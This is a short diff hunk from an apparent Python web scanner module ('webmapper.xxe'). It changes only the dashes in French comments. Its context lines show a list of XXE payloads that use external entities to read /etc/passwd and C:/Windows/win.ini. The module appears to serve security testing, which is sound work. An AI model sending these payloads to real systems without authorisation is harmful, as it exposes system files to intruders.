@@ -17,16 +17,16 @@ logger = logging.getLogger("webmapper.xxe")
 DELAY = 0.5
 TIMEOUT = 10
 
-# Payloads XXE — lecture de fichier local et provocation d'erreur parser
+# Payloads XXE - lecture de fichier local et provocation d'erreur parser
 XXE_PAYLOADS = [
-    # Linux — lecture /etc/passwd
+    # Linux - lecture /etc/passwd
     (
         '<?xml version="1.0" encoding="UTF-8"?>'
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<root>&xxe;</root>',
         "xxe_lfi_linux",
     ),
-    # Windows — lecture win.ini
+    # Windows - lecture win.ini
     (
         '<?xml version="1.0" encoding="UTF-8"?>'
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
